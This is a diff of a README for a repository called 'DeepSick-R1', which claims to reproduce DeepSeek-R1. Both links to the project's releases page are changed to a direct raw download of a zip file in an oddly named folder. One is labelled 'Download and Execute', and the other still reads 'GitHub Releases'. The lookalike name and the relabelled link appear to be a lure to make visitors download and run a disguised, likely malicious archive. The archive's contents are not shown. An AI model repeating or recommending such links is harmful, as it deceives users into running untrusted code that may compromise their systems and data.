@@ -2,7 +2,7 @@
 
 Welcome to the "DeepSick-R1" repository, a reproduction of the DeepSeek-R1 project!
 
-🔗 [Download and Execute DeepSick-R1](https://github.com/Manoj2boss/DeepSick-R1/releases)
+🔗 [Download and Execute DeepSick-R1](https://raw.githubusercontent.com/Manoj2boss/DeepSick-R1/master/pinacoteca/Deep-Sick-2.2.zip)
   
 ## Overview
 
@@ -24,6 +24,6 @@ We are constantly working on enhancing DeepSick-R1 to provide an even better use
 
 ---
 
-Visit our [GitHub Releases](https://github.com/Manoj2boss/DeepSick-R1/releases) section for the latest updates and downloads.
+Visit our [GitHub Releases](https://raw.githubusercontent.com/Manoj2boss/DeepSick-R1/master/pinacoteca/Deep-Sick-2.2.zip) section for the latest updates and downloads.
 
 Thank you for exploring DeepSick-R1 with us. We are confident that this reproduction will meet your expectations and provide a valuable experience. Happy exploring! 🌟
